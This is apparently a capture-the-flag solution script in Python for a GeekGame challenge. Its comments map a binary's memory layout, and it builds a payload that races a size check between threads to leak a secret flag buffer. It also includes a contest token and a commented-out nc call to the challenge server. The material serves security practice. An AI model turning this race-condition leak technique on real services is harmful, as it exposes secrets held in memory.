import subprocess

# 4060 --- p
# 4160 --- usleep_time
# 4180 --- flag_buf (secret)
# 41C0 --- output_buf
# 4200 --- buf
# 4230 --- size

# Call main:
# scanf -> size      # Must be 4
# read(0, &p, 0x104)

# Call do_output:
# check size <= 4
# check size > 0
# check strlen(flag_buf) <= 48
# sleep usleep_time

# Switch to get_thread2_input:
# scanf -> size
# check size <= 49
# memcpy buf p size
# print "input success!"

# Back to do_output:
# memcpy output_buf flag_buf size # size is 48
# puts output_buf                 # Leak flag

token = "256:MEYCIQDRGm_v_YIBd5HzshlAQwahPR0eXiFMI_zAzZU-JLvAFQIhAO6SCgDNRpeZMHHqc6G6zi_B6IEYFis9m8q7Nq5xMV9H"

s = token.encode() + b'\n4\n' + b'x'*256 + \
    b"!!!!" + \
    b'\n49\n' + b'y' * 48 + b'\x04' + b'\n'

# print(s)
print(s.decode())

# out, err = subprocess.Popen(["nc", "prob11.geekgame.pku.edu.cn", "10011"],
#                             stdin=subprocess.PIPE).communicate(input=s, timeout=10)

# print(out.decode())
# print(err.decode())

# child.stdin.write(s)
# child.stdin.close()
# child.wait()
